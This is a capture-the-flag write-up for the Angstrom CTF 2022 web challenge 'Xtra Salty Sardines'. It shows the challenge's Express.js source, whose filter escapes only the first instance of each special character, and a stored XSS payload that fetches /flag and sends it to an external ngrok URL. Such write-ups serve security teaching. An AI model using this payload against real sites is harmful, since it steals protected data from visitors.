---
name: Xtra Salty Sardines (2022)
event: Angstrom CTF 2022
category: Web
description: Writeup for Xtra Salty Sardines (Web) - Angstrom CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Xtra Salty Sardines

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/YmJoeoXilac/0.jpg)](https://youtu.be/YmJoeoXilac?t=1078 "Angstrom CTF 2022: Xtra Salty Sardines")

## Description

> Clam was intensely brainstorming new challenge ideas, when his stomach growled! He opened his favorite tin of salty sardines, took a bite out of them, and then got a revolutionary new challenge idea. What if he wrote a site with an extremely suggestive acronym?

## Source

{% code overflow="wrap" %}
```js
const express = require("express");
const path = require("path");
const fs = require("fs");
const cookieParser = require("cookie-parser");

const app = express();
const port = Number(process.env.PORT) || 8080;
const sardines = {};

const alpha = "abcdefghijklmnopqrstuvwxyz";

const secret = process.env.ADMIN_SECRET || "secretpw";
const flag = process.env.FLAG || "actf{placeholder_flag}";

function genId() {
    let ret = "";
    for (let i = 0; i < 10; i++) {
        ret += alpha[Math.floor(Math.random() * alpha.length)];
    }
    return ret;
}

app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

// the admin bot will be able to access this
app.get("/flag", (req, res) => {
    if (req.cookies.secret === secret) {
        res.send(flag);
    } else {
        res.send("you can't view this >:(");
    }
});

app.post("/mksardine", (req, res) => {
    if (!req.body.name) {
        res.status(400).type("text/plain").send("please include a name");
        return;
    }
    // no pesky chars allowed
    const name = req.body.name
        .replace("&", "&amp;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
        .replace("<", "&lt;")
        .replace(">", "&gt;");
    if (name.length === 0 || name.length > 2048) {
        res.status(400)
            .type("text/plain")
            .send("sardine name must be 1-2048 chars");
        return;
    }
    const id = genId();
    sardines[id] = name;
    res.redirect("/sardines/" + id);
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/sardines/:sardine", (req, res) => {
    const name = sardines[req.params.sardine];
    if (!name) {
        res.status(404).type("text/plain").send("sardine not found :(");
        return;
    }
    const sardine = fs
        .readFileSync(path.join(__dirname, "sardine.html"), "utf8")
        .replaceAll("$NAME", name.replaceAll("$", "$$$$"));
    res.type("text/html").send(sardine);
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```
{% endcode %}

## Solution

{% code overflow="wrap" %}
```html
<!--
    1. Provide special chars "'&<> to bypass filter (since they're only checked once)
    2. Close off the h1 tag
    3. Fetch /flag and send the response to ngrok (requestbin, webhook etc)
-->
"'&<></h1><script>fetch('/flag').then(r => { r.text().then(t => { fetch('https://0e00-81-103-153-174.ngrok.io/?flag=' + btoa(t), { 'mode': 'no-cors' }) }) })</script>
```
{% endcode %}
